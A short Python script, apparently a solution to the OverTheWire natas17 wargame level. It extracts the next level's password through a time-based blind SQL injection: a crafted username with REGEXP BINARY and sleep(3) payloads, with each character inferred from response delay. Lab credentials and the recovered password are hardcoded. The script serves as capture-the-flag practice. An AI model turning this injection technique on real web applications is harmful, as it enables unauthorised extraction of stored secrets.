#!/bin/python3
#password per natas18: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
import requests
import time

user = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = 'http://%s.natas.labs.overthewire.org/' % user

sessione = requests.Session()
pass18 = ''

while len(pass18) < 32:
    for i in "abcdefghjkilmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVXYWZ0123456789":
        r = 'natas18" and password REGEXP BINARY "^' + pass18 + '{}" and sleep(3) and username="natas18'.format(i)
        inizio = time.time()
        post = sessione.post(url, data={'username': r}, auth=(user, password))
        if time.time()-inizio > 2:
            pass18 += i
            print(pass18)
